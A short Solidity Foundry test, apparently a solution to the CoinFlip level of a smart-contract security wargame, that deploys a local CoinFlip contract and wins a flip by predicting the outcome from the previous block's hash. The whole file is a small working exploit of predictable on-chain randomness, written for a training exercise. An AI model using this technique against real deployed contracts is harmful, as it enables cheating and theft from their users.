// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/03_CoinFlip.sol";

contract AttackerCoinFlipTest is Test {
    function testCoinflip() external {
        vm.prank(address(0x1));
        CoinFlip coinflip = new CoinFlip();

        uint256 blockValue = uint256(blockhash(block.number - 1));

        bool success = coinflip.flip(blockValue >> 255 == 1);
        assertTrue(success);
    }
}
